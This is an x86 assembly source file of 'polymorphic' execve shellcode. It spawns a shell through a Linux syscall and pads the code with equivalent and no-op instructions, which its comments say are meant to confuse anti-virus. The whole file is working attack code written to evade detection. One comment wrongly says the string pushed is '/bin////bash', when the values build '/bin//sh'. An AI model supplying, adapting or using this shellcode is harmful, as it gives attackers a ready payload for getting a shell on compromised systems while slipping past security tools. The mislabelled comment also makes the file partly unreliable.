; Author: Eduardo Silva
; Polymorphic Execve Stack Shellcode
; 
;Adding equivalent isntructions to confuse anti-virus for example
;can add noisy isntructions too (nops, cld, std,...)
;

global _start

section .text

_start:

	; push the first null dword
	;xor eax, eax
	mov ebx, eax
	xor eax, ebx

	;push eax
	mov dword [esp-4], eax
	sub esp, 4

	; push /bin////bash
	
	cld	; clear direction (no influence and is not used)
	mov esi, 0x57621e1e
	add esi, 0x11111111
	mov dword [esp-4], esi
	std	; set direction flag (more noise to confuse)

	;mov dword [esp-4], 0x68732f2f
	mov dword [esp-8], 0x6e69622f
	sub esp, 8	

	;push 0x68732f2f
	;push 0x6e69622f

	mov ebx, esp
	
	;push null and mov it to ebx (envp)
	push eax
	mov edx, esp
	;cdq ; put 0 into edx using thr signed bit from eax (how to work??how to work????)

	; push address of /bin///bash (ebx) to ecx 
	push ebx
	mov ecx, esp

	;call execve syscall
	mov al, 0xb
	int 0x80	


